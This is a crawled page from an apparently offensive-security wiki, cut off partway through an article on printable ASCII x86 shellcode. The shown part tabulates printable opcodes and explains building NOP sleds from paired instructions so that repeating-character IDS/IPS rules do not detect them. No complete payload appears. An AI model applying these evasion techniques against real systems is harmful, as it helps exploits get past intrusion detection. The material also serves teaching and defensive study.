http://www.blackhatlibrary.net/Ascii_shellcode
HTTP/1.1 200 OK
Server: cloudflare-nginx
Date: Tue, 22 Jul 2014 17:37:55 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: __cfduid=d92e6f7442e435c87590cb0a888f195501406050672159; expires=Mon, 23-Dec-2019 23:50:00 GMT; path=/; domain=.blackhatlibrary.net; HttpOnly
X-Powered-By: PHP/5.4.15
Content-language: en
Vary: Accept-Encoding, Cookie
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Cache-Control: private, must-revalidate, max-age=0
CF-RAY: 14e1689cffe3087a-IAD
Content-Encoding: gzip

<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8" />
<title>Ascii shellcode - Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</title>
<meta name="generator" content="MediaWiki" />
<meta name="og:title" content="Ascii shellcode" />
<meta name="og:type" content="article" />
<meta name="og:image" content="http://www.blackhatacademy.org/security101/logo.png" />
<meta name="og:site_name" content="Blackhat Academy - Security101 Wiki" />
<meta name="og:description" content="For security reasons, we cannot remotely parse content.  Please visit the link provided to see the full article!" />
<link rel="shortcut icon" href="/favicon.ico" />
<link rel="search" type="application/opensearchdescription+xml" href="/opensearch_desc.php" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools (en)" />
<link rel="EditURI" type="application/rsd+xml" href="http://www.blackhatlibrary.net/api.php?action=rsd" />
<link rel="alternate" type="application/atom+xml" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools Atom feed" href="/index.php?title=Special:RecentChanges&amp;feed=atom" />
<link rel="stylesheet" href="/load.php?debug=false&amp;lang=en&amp;modules=mediawiki.legacy.commonPrint%2Cshared&amp;only=styles&amp;skin=monobook&amp;*" />
<link rel="stylesheet" href="/skins/monobook/main.css?" media="screen" />
<!--[if lt IE 5.5000]><link rel="stylesheet" href="/skins/monobook/IE50Fixes.css?" media="screen" /><![endif]-->
<!--[if IE 5.5000]><link rel="stylesheet" href="/skins/monobook/IE55Fixes.css?" media="screen" /><![endif]-->
<!--[if IE 6]><link rel="stylesheet" href="/skins/monobook/IE60Fixes.css?" media="screen" /><![endif]-->
<!--[if IE 7]><link rel="stylesheet" href="/skins/monobook/IE70Fixes.css?" media="screen" /><![endif]--><meta name="ResourceLoaderDynamicStyles" content="" />
<style type="text/css">/*<![CDATA[*/
.source-asm {line-height: normal;}
.source-asm li, .source-asm pre {
	line-height: normal; border: 0px none white;
}
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for asm
 * CSS class: source-asm, CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2008 Benny Baumann
 * (http://qbnz.com/highlighter/ and http://geshi.org/)
 * --------------------------------------
 */
.asm.source-asm .de1, .asm.source-asm .de2 {font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;}
.asm.source-asm  {font-family:monospace;}
.asm.source-asm .imp {font-weight: bold; color: red;}
.asm.source-asm li, .asm.source-asm .li1 {font-weight: normal; vertical-align:top;}
.asm.source-asm .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
.asm.source-asm .li2 {font-weight: bold; vertical-align:top;}
.asm.source-asm .kw1 {color: #00007f; font-weight: bold;}
.asm.source-asm .kw2 {color: #0000ff; font-weight: bold;}
.asm.source-asm .kw3 {color: #00007f;}
.asm.source-asm .kw4 {color: #000000; font-weight: bold;}
.asm.source-asm .kw5 {color: #000000; font-weight: bold;}
.asm.source-asm .co1 {color: #666666; font-style: italic;}
.asm.source-asm .co2 {color: #adadad; font-style: italic;}
.asm.source-asm .es0 {color: #000099; font-weight: bold;}
.asm.source-asm .br0 {color: #009900; font-weight: bold;}
.asm.source-asm .sy0 {color: #339933;}
.asm.source-asm .st0 {color: #7f007f;}
.asm.source-asm .nu0 {color: #0000ff;}
.asm.source-asm .ln-xtra, .asm.source-asm li.ln-xtra, .asm.source-asm div.ln-xtra {background-color: #ffc;}
.asm.source-asm span.xtra { display:block; }

/*]]>*/
</style>
<style type="text/css">/*<![CDATA[*/
@import "/index.php?title=MediaWiki:Geshi.css&usemsgcache=yes&action=raw&ctype=text/css&smaxage=18000";
/*]]>*/
</style><style type="text/css">/*<![CDATA[*/
.source-bash {line-height: normal;}
.source-bash li, .source-bash pre {
	line-height: normal; border: 0px none white;
}
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for bash
 * CSS class: source-bash, CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2008 Benny Baumann
 * (http://qbnz.com/highlighter/ and http://geshi.org/)
 * --------------------------------------
 */
.bash.source-bash .de1, .bash.source-bash .de2 {font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;}
.bash.source-bash  {font-family:monospace;}
.bash.source-bash .imp {font-weight: bold; color: red;}
.bash.source-bash li, .bash.source-bash .li1 {font-weight: normal; vertical-align:top;}
.bash.source-bash .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
.bash.source-bash .li2 {font-weight: bold; vertical-align:top;}
.bash.source-bash .kw1 {color: #000000; font-weight: bold;}
.bash.source-bash .kw2 {color: #c20cb9; font-weight: bold;}
.bash.source-bash .kw3 {color: #7a0874; font-weight: bold;}
.bash.source-bash .co0 {color: #666666; font-style: italic;}
.bash.source-bash .co1 {color: #800000;}
.bash.source-bash .co2 {color: #cc0000; font-style: italic;}
.bash.source-bash .co3 {color: #000000; font-weight: bold;}
.bash.source-bash .es1 {color: #000099; font-weight: bold;}
.bash.source-bash .es2 {color: #007800;}
.bash.source-bash .es3 {color: #007800;}
.bash.source-bash .es4 {color: #007800;}
.bash.source-bash .es5 {color: #780078;}
.bash.source-bash .es_h {color: #000099; font-weight: bold;}
.bash.source-bash .br0 {color: #7a0874; font-weight: bold;}
.bash.source-bash .sy0 {color: #000000; font-weight: bold;}
.bash.source-bash .st0 {color: #ff0000;}
.bash.source-bash .st_h {color: #ff0000;}
.bash.source-bash .nu0 {color: #000000;}
.bash.source-bash .re0 {color: #007800;}
.bash.source-bash .re1 {color: #007800;}
.bash.source-bash .re2 {color: #007800;}
.bash.source-bash .re4 {color: #007800;}
.bash.source-bash .re5 {color: #660033;}
.bash.source-bash .ln-xtra, .bash.source-bash li.ln-xtra, .bash.source-bash div.ln-xtra {background-color: #ffc;}
.bash.source-bash span.xtra { display:block; }

/*]]>*/
</style>
<style type="text/css">/*<![CDATA[*/
@import "/index.php?title=MediaWiki:Geshi.css&usemsgcache=yes&action=raw&ctype=text/css&smaxage=18000";
/*]]>*/
</style></head>
<body class="mediawiki ltr ns-0 ns-subject page-Ascii_shellcode skin-monobook">
<div id="globalWrapper">
<div id="column-content"><div id="content">
	<a id="top"></a>
	<div id="siteNotice"><div id="localNotice"><div align="right"><i>Questions about this topic? <a href="/Special:UserLogin" title="Special:UserLogin">Sign up</a> to ask in the talk tab</i>.</div><br />
</div></div>	<div align="center" id="ad"><script type="text/javascript"><!--
google_ad_client = "ca-pub-3100048614381705";
google_ad_slot = "3567986077";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</div>
	<h1 id="firstHeading" class="firstHeading">Ascii shellcode</h1>
	<div id="bodyContent">
		<div id="siteSub">From Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</div>
		<div id="contentSub"></div>
		<div id="jump-to-nav">Jump to: <a href="#column-one">navigation</a>, <a href="#searchInput">search</a></div>
		<!-- start content -->
<p>Ascii <a href="/Shellcode" title="Shellcode" class="mw-redirect">shellcode</a> bypasses many character filters and is somewhat easy to learn due to the fact that many ascii instructions are only one or two <a href="/Byte" title="Byte">byte</a> instructions. The smaller the instructions, the more easily obfuscated and randomized they are. During many <a href="/Buffer_Overflows" title="Buffer Overflows" class="mw-redirect">buffer overflows</a> the buffer is limited to a very small writeable segment of memory, so many times it is important to utilize the smallest possible combination of opcodes.  In other cases, more buffer space is available and things like <a href="#Encoding_Shellcode_:_Ascii_Art">ascii art shellcode</a> are more plausible.
</p>
<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
<tr>
<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
</td>
<td><center>This article is part of an all-encompassing <a href="/Shellcode" title="Shellcode" class="mw-redirect">shellcode</a> portal.  Sources are available in <a href="/Shellcode/Appendix" title="Shellcode/Appendix">the appendix</a> or in the downloadable <a href="/Shellcodecs" title="Shellcodecs">shellcodecs</a> package.  This page primarily focuses on printable x86 opcodes on <b>32-bit</b> systems.  The <a href="/Alphanumeric_shellcode" title="Alphanumeric shellcode" class="mw-redirect">alphanumeric shellcode</a> article contains an explanation of printable 64-bit <a href="/Shellcode" title="Shellcode" class="mw-redirect">shellcode</a>, and compatibility notes.</center>
</td></tr></table>
<table style="text-align:center; background: #fff; border: 1px solid #000; width: 50%; margin: 5px auto;">
<tr>
<td><i>Ascii shellcode requires a basic understanding of <a href="/Assembly_Basics" title="Assembly Basics" class="mw-redirect">assembly and the stack</a>, as well as <a href="/Buffer_Overflows" title="Buffer Overflows" class="mw-redirect">stack overflows</a>.</i>
</td></tr></table>
<p><br />
<font size="-2">Special thanks to <a href="/User:Hatter" title="User:Hatter">hatter</a> for his contributions to this article.</font>
</p>
<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
<ul>
<li class="toclevel-1 tocsection-1"><a href="#Available_Instructions"><span class="tocnumber">1</span> <span class="toctext">Available Instructions</span></a></li>
<li class="toclevel-1 tocsection-2"><a href="#Constructing_the_NOP_Sled"><span class="tocnumber">2</span> <span class="toctext">Constructing the NOP Sled</span></a>
<ul>
<li class="toclevel-2 tocsection-3"><a href="#Instructions"><span class="tocnumber">2.1</span> <span class="toctext">Instructions</span></a></li>
<li class="toclevel-2 tocsection-4"><a href="#Implementation"><span class="tocnumber">2.2</span> <span class="toctext">Implementation</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-5"><a href="#Basic_Encoding"><span class="tocnumber">3</span> <span class="toctext">Basic Encoding</span></a>
<ul>
<li class="toclevel-2 tocsection-6"><a href="#Single_Byte_Register_Manipulation"><span class="tocnumber">3.1</span> <span class="toctext">Single Byte Register Manipulation</span></a></li>
<li class="toclevel-2 tocsection-7"><a href="#Reviewing_XOR"><span class="tocnumber">3.2</span> <span class="toctext">Reviewing XOR</span></a></li>
<li class="toclevel-2 tocsection-8"><a href="#DWORD_Manipulation"><span class="tocnumber">3.3</span> <span class="toctext">DWORD Manipulation</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-9"><a href="#Introduction_to_Polymorphic_Ascii_Shellcode"><span class="tocnumber">4</span> <span class="toctext">Introduction to Polymorphic Ascii Shellcode</span></a>
<ul>
<li class="toclevel-2 tocsection-10"><a href="#Pushing_Nops"><span class="tocnumber">4.1</span> <span class="toctext">Pushing Nops</span></a></li>
<li class="toclevel-2 tocsection-11"><a href="#A_sequence_for_exit"><span class="tocnumber">4.2</span> <span class="toctext">A sequence for exit</span></a></li>
<li class="toclevel-2 tocsection-12"><a href="#From_assembling_to_machine_code"><span class="tocnumber">4.3</span> <span class="toctext">From assembling to machine code</span></a></li>
<li class="toclevel-2 tocsection-13"><a href="#Converting_Exit_to_Printable_Ascii"><span class="tocnumber">4.4</span> <span class="toctext">Converting Exit to Printable Ascii</span></a>
<ul>
<li class="toclevel-3 tocsection-14"><a href="#eax_.26_ebx"><span class="tocnumber">4.4.1</span> <span class="toctext">eax &amp; ebx</span></a></li>
<li class="toclevel-3 tocsection-15"><a href="#The_Kernel_Interrupt"><span class="tocnumber">4.4.2</span> <span class="toctext">The Kernel Interrupt</span></a></li>
<li class="toclevel-3 tocsection-16"><a href="#The_Code"><span class="tocnumber">4.4.3</span> <span class="toctext">The Code</span></a></li>
</ul>
</li>
<li class="toclevel-2 tocsection-17"><a href="#Testing_Our_Code"><span class="tocnumber">4.5</span> <span class="toctext">Testing Our Code</span></a>
<ul>
<li class="toclevel-3 tocsection-18"><a href="#Analyzing_the_Buffer"><span class="tocnumber">4.5.1</span> <span class="toctext">Analyzing the Buffer</span></a></li>
<li class="toclevel-3 tocsection-19"><a href="#A_Successful_Overflow"><span class="tocnumber">4.5.2</span> <span class="toctext">A Successful Overflow</span></a></li>
</ul>
</li>
</ul>
</li>
<li class="toclevel-1 tocsection-20"><a href="#Encoding_Shellcode_:_Ascii_Art"><span class="tocnumber">5</span> <span class="toctext">Encoding Shellcode&#160;: Ascii Art</span></a>
<ul>
<li class="toclevel-2 tocsection-21"><a href="#Starting_Shellcode"><span class="tocnumber">5.1</span> <span class="toctext">Starting Shellcode</span></a></li>
<li class="toclevel-2 tocsection-22"><a href="#Comparisons_and_Jumps"><span class="tocnumber">5.2</span> <span class="toctext">Comparisons and Jumps</span></a></li>
<li class="toclevel-2 tocsection-23"><a href="#The_Ascii_Art"><span class="tocnumber">5.3</span> <span class="toctext">The Ascii Art</span></a></li>
<li class="toclevel-2 tocsection-24"><a href="#Jump_Sequencing"><span class="tocnumber">5.4</span> <span class="toctext">Jump Sequencing</span></a></li>
<li class="toclevel-2 tocsection-25"><a href="#Ascii_Art_Code"><span class="tocnumber">5.5</span> <span class="toctext">Ascii Art Code</span></a></li>
</ul>
</li>
</ul>
</td></tr></table>
<h2> <span class="mw-headline" id="Available_Instructions"> Available Instructions </span></h2>
<p>The printable ascii <a href="/Shellcode" title="Shellcode" class="mw-redirect">shellcode</a> character space consists within 3 main ranges, while symbols exist between them:
</p>
<ul><li> Lowercase alpha falls between 0x61 and 0x7a (a-z).
</li><li> Uppercase alpha falls between 0x41 and 0x5a (A-Z).
</li><li> Numeric space falls between 0x30 and 0x39 (0-9).
</li></ul>
<table class="wikitable" style="text-align: center">
<caption> ASCII Shellcode Table
</caption>
<tr>
<th scope="col"> ASCII Value
</th>
<th scope="col"> Hex Opcode
</th>
<th scope="col"> Assembly Equivalent
</th></tr>

<tr>
<td> 0
</td>
<td> \x30
</td>
<td> xor
</td></tr>
<tr>
<td> 1
</td>
<td> \x31
</td>
<td> xor
</td></tr>
<tr>
<td> 2
</td>
<td> \x32
</td>
<td> xor
</td></tr>
<tr>
<td> 3
</td>
<td> \x33
</td>
<td> xor
</td></tr>
<tr>
<td> 4
</td>
<td> \x34
</td>
<td> xor al, 0x## [byte]
</td></tr>
<tr>
<td> 5
</td>
<td> \x35
</td>
<td> xor eax, 0x######## [DWORD]
</td></tr>
<tr>
<td> 6
</td>
<td> \x36
</td>
<td> SS Segment Override
</td></tr>
<tr>
<td> 7
</td>
<td> \x37
</td>
<td> aaa
</td></tr>
<tr>
<td> 8
</td>
<td> \x38
</td>
<td> cmp
</td></tr>
<tr>
<td> 9
</td>
<td> \x39
</td>
<td> cmp
</td></tr>
<tr>
<td>&#160;:
</td>
<td> \x3a
</td>
<td> cmp
</td></tr>
<tr>
<td>&#160;;
</td>
<td> \x3b
</td>
<td> cmp
</td></tr>
<tr>
<td> &lt;
</td>
<td> \x3c
</td>
<td> cmp al, 0x## [byte]
</td></tr>
<tr>
<td> =
</td>
<td> \x3d
</td>
<td> cmp eax, 0x######## [DWORD]
</td></tr>
<tr>
<td> &gt;
</td>
<td> \x3e
</td>
<td> [undocced nop]
</td></tr>
<tr>
<td>&#160;?
</td>
<td> \x3f
</td>
<td> aas
</td></tr>
<tr>
<td> @
</td>
<td> \x40
</td>
<td> inc eax
</td></tr>
<tr>
<td> A
</td>
<td> \x41
</td>
<td> inc ecx
</td></tr>
<tr>
<td> B
</td>
<td> \x42
</td>
<td> inc edx
</td></tr>
<tr>
<td> C
</td>
<td> \x43
</td>
<td> inc ebx
</td></tr>
<tr>
<td> D
</td>
<td> \x44
</td>
<td> inc esp
</td></tr>
<tr>
<td> E
</td>
<td> \x45
</td>
<td> inc ebp
</td></tr>
<tr>
<td> F
</td>
<td> \x46
</td>
<td> inc esi
</td></tr>
<tr>
<td> G
</td>
<td> \x47
</td>
<td> inc edi
</td></tr>
<tr>
<td> H
</td>
<td> \x48
</td>
<td> dec eax
</td></tr>
<tr>
<td> I
</td>
<td> \x49
</td>
<td> dec ecx
</td></tr>
<tr>
<td> J
</td>
<td> \x4a
</td>
<td> dec edx
</td></tr>
<tr>
<td> K
</td>
<td> \x4b
</td>
<td> dec ebx
</td></tr>
<tr>
<td> L
</td>
<td> \x4c
</td>
<td> dec esp
</td></tr>
<tr>
<td> M
</td>
<td> \x4d
</td>
<td> dec ebp
</td></tr>
<tr>
<td> N
</td>
<td> \x4e
</td>
<td> dec esi
</td></tr>
<tr>
<td> O
</td>
<td> \x4f
</td>
<td> dec edi
</td></tr>
<tr>
<td> P
</td>
<td> \x50
</td>
<td> push eax
</td></tr>
<tr>
<td> Q
</td>
<td> \x51
</td>
<td> push ecx
</td></tr>
<tr>
<td> R
</td>
<td> \x52
</td>
<td> push edx
</td></tr>
<tr>
<td> S
</td>
<td> \x53
</td>
<td> push ebx
</td></tr>
<tr>
<td> T
</td>
<td> \x54
</td>
<td> push esp
</td></tr>
<tr>
<td> U
</td>
<td> \x55
</td>
<td> push ebp
</td></tr>
<tr>
<td> V
</td>
<td> \x56
</td>
<td> push esi
</td></tr>
<tr>
<td> W
</td>
<td> \x57
</td>
<td> push edi
</td></tr>
<tr>
<td> X
</td>
<td> \x58
</td>
<td> pop eax
</td></tr>
<tr>
<td> Y
</td>
<td> \x59
</td>
<td> pop ecx
</td></tr>
<tr>
<td> Z
</td>
<td> \x5a
</td>
<td> pop edx
</td></tr>
<tr>
<td> [
</td>
<td> \x5b
</td>
<td> pop ebx
</td></tr>
<tr>
<td> \
</td>
<td> \x5c
</td>
<td> pop esp
</td></tr>
<tr>
<td> ]
</td>
<td> \x5d
</td>
<td> pop ebp
</td></tr>
<tr>
<td> ^
</td>
<td> \x5e
</td>
<td> pop esi
</td></tr>
<tr>
<td> _
</td>
<td> \x5f
</td>
<td> pop edi
</td></tr>
<tr>
<td> `
</td>
<td> \x60
</td>
<td> pushad
</td></tr>
<tr>
<td> a
</td>
<td> \x61
</td>
<td> popad
</td></tr>
<tr>
<td> b
</td>
<td> \x62
</td>
<td> bound
</td></tr>
<tr>
<td> c
</td>
<td> \x63
</td>
<td> arpl
</td></tr>
<tr>
<td> d
</td>
<td> \x64
</td>
<td> FS Segment Override
</td></tr>
<tr>
<td> e
</td>
<td> \x65
</td>
<td> GS Segment Override
</td></tr>
<tr>
<td> f
</td>
<td> \x66
</td>
<td> 16 Bit Operand Size
</td></tr>
<tr>
<td> g
</td>
<td> \x67
</td>
<td> 16 Bit Address Size
</td></tr>
<tr>
<td> h
</td>
<td> \x68
</td>
<td> push 0x######## [dword]
</td></tr>
<tr>
<td> i
</td>
<td> \x69
</td>
<td> imul reg/mem with immediate to reg/mem
</td></tr>
<tr>
<td> j
</td>
<td> \x6a
</td>
<td> push 0x## [byte]
</td></tr>
<tr>
<td> k
</td>
<td> \x6b
</td>
<td> imul immediate with reg into reg
</td></tr>
<tr>
<td> l
</td>
<td> \x6c
</td>
<td> insb es:[edi], [dx]
</td></tr>
<tr>
<td> m
</td>
<td> \x6d
</td>
<td> insl es:[edi], [dx]
</td></tr>
<tr>
<td> n
</td>
<td> \x6e
</td>
<td> outsb [dx], dx:[esi]
</td></tr>
<tr>
<td> o
</td>
<td> \x6f
</td>
<td> outsl [dx], ds:[esi]
</td></tr>
<tr>
<td> p
</td>
<td> \x70
</td>
<td> jo 0x## [byte relative offset]
</td></tr>
<tr>
<td> q
</td>
<td> \x71
</td>
<td> jno 0x## [byte relative offset]
</td></tr>
<tr>
<td> r
</td>
<td> \x72
</td>
<td> jb 0x## [byte relative offset]
</td></tr>
<tr>
<td> s
</td>
<td> \x73
</td>
<td> jae 0x## [byte relative offset]
</td></tr>
<tr>
<td> t
</td>
<td> \x74
</td>
<td> je 0x## [byte relative offset]
</td></tr>
<tr>
<td> u
</td>
<td> \x75
</td>
<td> jne 0x## [byte relative offset]
</td></tr>
<tr>
<td> v
</td>
<td> \x76
</td>
<td> jbe 0x## [byte relative offset]
</td></tr>
<tr>
<td> w
</td>
<td> \x77
</td>
<td> ja 0x## [byte relative offset]
</td></tr>
<tr>
<td> x
</td>
<td> \x78
</td>
<td> js 0x## [byte relative offset]
</td></tr>
<tr>
<td> y
</td>
<td> \x79
</td>
<td> jns 0x## [byte relative offset]
</td></tr>
<tr>
<td> z
</td>
<td> \x7a
</td>
<td> jp 0x## [byte relative offset]
</td></tr></table>
<h2> <span class="mw-headline" id="Constructing_the_NOP_Sled"> Constructing the NOP Sled </span></h2>
<p>Most modern day <a href="/IPS" title="IPS">IPS</a> systems are capable of recognizing ASCII NOP sleds due to their popularity in modern exploitation.  Many <a href="/IPS" title="IPS">IPS</a> systems look for large strings of repeating characters.  The solution to this problem is to make use of 'effective NOPs', instead of simply NOPs.  Combine this with a randomization sequence and one can avoid <a href="/IPS" title="IPS">IPS</a> detection in a few simple steps.
</p>
<h3> <span class="mw-headline" id="Instructions"> Instructions </span></h3>
<table class="wikitable" style="text-align: center; width: 500px">
<caption> ASCII NOP Pairs (Figure 1)
</caption>
<tr>
<th scope="col"> ASCII Pair
</th>
<th scope="col"> Hex Opcode
</th>
<th scope="col"> Register
</th>
<th scope="col"> Instructions Used
</th>
<th scope="col"> Commonly Detected
</th></tr>
<tr>
<td> AI
</td>
<td> \x41\x49
</td>
<td>&#160;%ecx
</td>
<td> INC, DEC
</td>
<td> No
</td></tr>
<tr>
<td> @H
</td>
<td> \x40\x48
</td>
<td>&#160;%eax
</td>
<td> INC, DEC
</td>
<td> <b>Yes</b>
</td></tr>
<tr>
<td> BJ
</td>
<td> \x42\x4A
</td>
<td>&#160;%edx
</td>
<td> INC, DEC
</td>
<td> No
</td></tr>
<tr>
<td> CK
</td>
<td> \x43\x4B
</td>
<td>&#160;%ebx
</td>
<td> INC, DEC
</td>
<td> No
</td></tr>
<tr>
<td> DL
</td>
<td> \x44\x4C
</td>
<td>&#160;%esp
</td>
<td> INC, DEC
</td>
<td> No
</td></tr>
<tr>
<td> EM
</td>
<td> \x45\x4D
</td>
<td>&#160;%ebp
</td>
<td> INC, DEC
</td>
<td> No
</td></tr>
<tr>
<td> FN
</td>
<td> \x46\x4E
</td>
<td>&#160;%esi
</td>
<td> INC, DEC
</td>
<td> No
</td></tr>
<tr>
<td> GO
</td>
<td> \x47\x4F
</td>
<td>&#160;%edi
</td>
<td> INC, DEC
</td>
<td> No
</td></tr></table>
<p>The Pair can be put in any order, e.g. AI, IA, @H, H@, as long as both characters are used the same number of times.  They can even be jumbled together.  The above is only true when using INC and DEC NOPs exclusively.
</p>
<table class="wikitable" style="text-align: center; width: 500px">
<caption> ASCII NOP Pairs (Figure 2)
</caption>
<tr>
<th scope="col"> ASCII Pair
</th>
<th scope="col"> Hex Opcode
</th>
<th scope="col"> Register
</th>
<th scope="col"> Instructions Used
</th>
<th scope="col"> Commonly Detected
</th></tr>
<tr>
<td> PX
</td>
<td> \x50\x58
</td>
<td>&#160;%eax
</td>
<td> PUSH, POP
</td>
<td> No
</td></tr>
<tr>
<td> QY
</td>
<td> \x51\x59
</td>
<td>&#160;%ecx
</td>
<td> PUSH, POP
</td>
<td> No
</td></tr>
<tr>
<td> RZ
</td>
<td> \x52\x5A
</td>
<td>&#160;%edx
</td>
<td> PUSH, POP
</td>
<td> No
</td></tr>
<tr>
<td> S[
</td>
<td> \x53\x5B
</td>
<td>&#160;%ebx
</td>
<td> PUSH, POP
</td>
<td> <b>Yes</b>
</td></tr>
<tr>
<td> T\
</td>
<td> \x54\x5C
</td>
<td>&#160;%esp
</td>
<td> PUSH, POP
</td>
<td> <b>Yes</b>
</td></tr>
<tr>
<td> U]
</td>
<td> \x55\x5D
</td>
<td>&#160;%ebp
</td>
<td> PUSH, POP
</td>
<td> <b>Yes</b>
</td></tr>
<tr>
<td> V^
</td>
<td> \x56\x5E
</td>
<td>&#160;%esi
</td>
<td> PUSH, POP
</td>
<td> <b>Yes</b>
</td></tr>
<tr>
<td> W_
</td>
<td> \x57\x5F
</td>
<td>&#160;%edi
</td>
<td> PUSH, POP
</td>
<td> <b>Yes</b>
</td></tr>
<tr>
<td> a`
</td>
<td> \x61\x60
</td>
<td> ALL
</td>
<td> PUSH, POP
</td>
<td> <b>Yes</b>
</td></tr></table>
<h3> <span class="mw-headline" id="Implementation"> Implementation </span></h3>
<div style="padding: .2em .3em; margin: .2em .2em; background-color: #FFF6BF; border: solid 2px #FFD324; font-size: 107%;"><b>Notice:</b> Proper combination of <a href="#Instructions">these instructions</a> will work to evade repeating-character based <a href="/IDS" title="IDS">IDS</a> and <a href="/IPS" title="IPS">IPS</a> systems.</div>
<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
<tr>
<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
</td>
<td>There are also other operations can be used as NOPs as well.  Of course, these operations do actually do things.  This won't affect exploit code because register values are preserved.
</td></tr></table>
<ul><li> For example, '4' or <b>0x34</b> is:
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">xor</span> <span class="kw3">al</span><span class="sy0">,</span> 0x??</pre></div></div>
</td></tr></table>
<ul><li> While '5', or <b>0x35</b>, is:
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">xor</span> <span class="kw3">eax</span><span class="sy0">,</span> 0x????</pre></div></div>
</td></tr></table>
<p>So, if <b>P5LULZX</b> were to execute, nothing would happen other than a waste of cpu cycles.  The <a href="/Assembly_Basics" title="Assembly Basics" class="mw-redirect">Assembly</a> looks like&#160;:
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">  <span class="br0">&#91;</span>intel<span class="br0">&#93;</span>				<span class="br0">&#91;</span>att sysV<span class="br0">&#93;</span>
  <span class="kw1">push</span> <span class="kw3">eax</span>			        pushl <span class="sy0">%</span><span class="kw3">eax</span>
  <span class="kw1">xor</span> <span class="kw3">eax</span><span class="sy0">,</span> <span class="nu0">0x4c554c5a</span>		        xorl $<span class="nu0">0x4c554c5a</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">eax</span>
  <span class="kw1">pop</span> <span class="kw3">eax</span>				popl <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td></tr></table>
<p>The value of the&#160;%eax register is momentarily changed and then restored..  It is not really going to modify execution flow, save for cpu cycle count.  There are more examples of this too, if the goal is only to create effective NOPs.  For example, <b>PhLULZX5LULZX</b>, adds more bytes to the NOP sled:
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">  <span class="br0">&#91;</span>intel<span class="br0">&#93;</span>				<span class="br0">&#91;</span>att sysV<span class="br0">&#93;</span>
  <span class="kw1">push</span> <span class="kw3">eax</span>			        pushl <span class="sy0">%</span><span class="kw3">eax</span>
  <span class="kw1">push</span> <span class="nu0">0x4c554c5a</span>			pushl $<span class="nu0">0x4c554c5a</span>
  <span class="kw1">pop</span> <span class="kw3">eax</span>				popl <span class="sy0">%</span><span class="kw3">eax</span>
  <span class="kw1">xor</span> <span class="kw3">eax</span><span class="sy0">,</span> <span class="nu0">0x4c554c5a</span>		        xorl $<span class="nu0">0x4c554c5a</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">eax</span>
  <span class="kw1">pop</span> <span class="kw3">eax</span>				popl <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td></tr></table>
<p>PUSH/POPS can be mixed with INC/DEC operands without much difficulty.  Once a register has been pushed to the stack, anything can be done to its value before popping that register back off the stack.
</p>
<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
<tr>
<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
</td>
<td>Even <a href="/Bitwise_Math#3.0_-_NOT.2C_AND.2C_OR_and_XOR" title="Bitwise Math" class="mw-redirect">arithmetic calculations</a> can be used as long as the original values of the <a href="/Assembly_Basics#Special_Registers" title="Assembly Basics" class="mw-redirect">registers</a> are restored.  This preserves the environment for the executing <a href="/Shellcode" title="Shellcode" class="mw-redirect">shellcode</a>.
</td></tr></table>
<p>In this example using the PUSH and POP instructions, <b>PRQXYZQPRXZY</b>, the code simply re-arranges the register values and puts them back in the right place.  
</p><p>The assembly is as follows:
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">  <span class="br0">&#91;</span>intel<span class="br0">&#93;</span>				<span class="br0">&#91;</span>att sysV<span class="br0">&#93;</span>
